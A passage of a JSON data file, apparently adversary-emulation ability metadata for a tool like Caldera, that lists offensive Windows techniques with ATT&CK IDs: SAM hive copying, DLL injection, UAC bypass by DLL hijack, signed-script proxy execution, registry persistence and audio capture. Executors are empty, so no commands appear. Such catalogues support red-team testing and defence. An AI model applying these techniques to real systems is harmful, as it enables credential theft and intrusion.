        "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Security Account Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "esentutl.exe SAM copy",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "d21b4ae13ee85560eb6b82c5c9150ae7",
        "technique_id": "T1003.002",
        "repeatable": false
    },
    {
        "description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "iwr or Invoke Web-Request download",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "5f468e3e1c415900aab5e33f88da8c60",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Script Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "manage-bde.wsf Signed Script Command Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b14f62dd9f3c6132609147710f4a55b3",
        "technique_id": "T1216",
        "repeatable": false
    },
    {
        "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "mavinject - Inject DLL into running process",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c0b42b65828121e95e34a7bbf1a004ce",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Proxy: Internal Proxy",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "portproxy reg key",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "b0eb5108debf92ed5707a964b2bf3481",
        "technique_id": "T1090.001",
        "repeatable": false
    },
    {
        "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Path Interception by Search Order Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "powerShell Persistence via hijacking default modules - Get-Variable.exe",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e538e0ff74962aaf1dbd08baa5c7853f",
        "technique_id": "T1574.008",
        "repeatable": false
    },
    {
        "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "secedit used to create a Run key in the HKLM Hive",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "57058d39378e4ce49ccc8560efc49ee5",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "svchost writing a file to a UNC path",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "e6715e61f5df646692c624b3499384c4",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Capture running processes and their loaded DLLs",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "tasklist Process Enumeration",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "8adf02e8-6e71-4244-886c-98c402857404",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Audio Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "using device audio capture commandlet",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "53d41aa7edbb10cea4c99df8c2b0862f",
        "technique_id": "T1123",
        "repeatable": false
    },
    {
        "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe",
        "buckets": [
            "privilege-escalation"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "wow64log DLL Hijack",
        "tactic": "privilege-escalation",
        "plugin": "stockpile",
        "ability_id": "95ad5d69-563e-477b-802b-4855bfb3be09",
        "technique_id": "T1548.002",
        "repeatable": false
    }
]